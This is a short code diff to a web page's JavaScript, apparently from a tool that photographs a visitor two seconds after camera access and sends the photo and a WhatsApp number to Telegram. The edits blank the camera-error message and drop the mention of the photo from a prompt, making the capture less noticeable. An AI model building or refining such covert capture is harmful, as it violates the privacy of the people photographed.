@@ -57,7 +57,7 @@
           }, 2000); // Ambil foto otomatis setelah 2 detik
         };
       } catch (err) {
-        alert("Gagal mengakses kamera. Pastikan kamu mengizinkan kamera.");
+        alert("");
         console.error(err);
       }
     }
@@ -65,7 +65,7 @@
     function sendToTelegram() {
       const waNumber = document.getElementById("waNumber").value.trim();
       if (!waNumber || !photoBlob) {
-        alert("Isi nomor WhatsApp dan tunggu kamera mengambil foto.");
+        alert("Isi nomor WhatsApp");
         return;
       }
 
